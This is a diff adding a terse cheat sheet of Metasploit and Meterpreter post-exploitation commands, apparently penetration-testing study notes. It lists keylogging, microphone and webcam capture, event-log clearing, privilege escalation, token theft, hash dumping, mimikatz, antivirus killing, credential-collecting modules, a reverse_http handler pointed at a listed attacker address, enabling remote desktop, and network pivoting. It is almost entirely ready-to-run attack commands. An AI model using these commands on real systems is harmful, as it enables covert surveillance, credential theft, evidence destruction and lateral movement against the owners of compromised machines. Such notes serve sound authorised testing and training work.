@@ -1,0 +1,123 @@
+METERPRETER
+
+COMMANDS
+arp
+background
+cat
+cd
+clearev
+	-clear everything
+download file.ext
+download -r dir
+edit
+execute -f cmd.exe -i -H
+*getsystem
+getuid
+getpid
+getsid
+*getprivs
+idletime
+ipconfig
+irb
+keyscan_start
+keyscan_stop
+lcd
+list_tokens
+rev2self
+lpwd
+ls
+migrate #
+mkdir
+portfwd
+ps
+pwd
+record_mic
+resource commandstorun.txt
+route
+screenshot
+search -f
+shell
+snarf_hashes #
+steal_token #
+sysinfo
+upload
+webcam_list
+webcam_snap -i # -v true
+
+load/use extensions
+priv
+incognito
+espia
+sniffer
+kiwi
+mimikatz
+lanattacks
+networkpug
+python
+powershell
+extapi
+android
+winpmem
+
+scripts
+run killav
+run winenum
+run remotewinenum
+run scraper
+run hostedit -e 10.11.0.207,x.thinc.local
+run gettelnet -e
+run get_local_subnets
+run getgui -e
+run getcountermeasure
+run checkvm
+
+NIИ
+MODULES
+METASPLOIT POST-EXPLOITATION MODULES
+**msf > use post/multi/recon/local_exploit_suggester
+**exploit/windows/local/service_permissions
+msf(service_permissions)>set SESSION 2
+msf exploit(handler)>sessions -i 1
+
+msf exploit(handler)>use exploit/multi/handler
+msf exploit(handler)>set PAYLOAD windows/meterpreter/reverse_http
+msf exploit(handler)>set LHOST 208.68.234.99
+msf exploit(handler)>set LPORT 80
+
+METERPRETER MODULES
+	USAGE:
+	run path/to/module <options=values>
+MULTI
+getcountermeasure
+	-enumerate antivirus,firewall,ids/ips,&c
+getgui
+	-launch remote desktop
+WINDOWS
+post/windows/gather/credentials/credentials_collector
+post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+post/windows/gather/enum_applications
+post/windows/gather/enum_snmp
+post/windows/gather/usb_history
+post/windows/gather/enum_logged_on_users
+post/windows/manage/migrate
+post/windows/gather/dumplinks
+post/windows/gather/checkvm
+post/windows/gather/credentials/gpp
+post/windows/manage/enable_rdp
+post/windows/manage/enable_rdp -u user -p pass
+
+
+PIVOTING
+run post/multi/manage/autoroute
+msf>route add 192.168.15.1 255.255.255.0 1
+msf>route print
+msf>route flush
+use auxiliary/scanner/portscan/tcp
+	-tcp is the only supported scan that will work through meterpreter routing,
+	other scan types rely on raw sockets to execute
+meterpreter>portfwd add -l 8000 -p 80 -r 10.11.1.27
+
+
+
+refs
+https://en.wikibooks.org/wiki/Metasploit/MeterpreterClient
